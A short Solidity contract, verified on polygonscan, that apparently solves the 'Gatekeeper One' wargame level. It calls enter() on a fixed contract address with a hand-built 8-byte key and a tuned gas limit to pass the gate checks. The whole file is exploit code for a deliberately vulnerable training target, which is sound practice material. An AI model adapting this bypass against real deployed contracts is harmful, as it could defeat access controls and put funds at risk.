/**
 *Submitted for verification at polygonscan.com on 2023-04-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GateAttack {

  address public target =  0x07165b4D00705f4854E256Cc338a9892C9ce2873;

  function attack(uint gl) public {
      bytes8 b = bytes8(
        abi.encodePacked(
            uint8(17),
            uint8(0),
            uint8(0),
            uint8(0),
            uint8(0),
            uint8(0),
            uint8(159),
            uint8(30)
        )
      );
      // 819368
      GatekeeperOne(target).enter{gas: gl}(b);
  }

}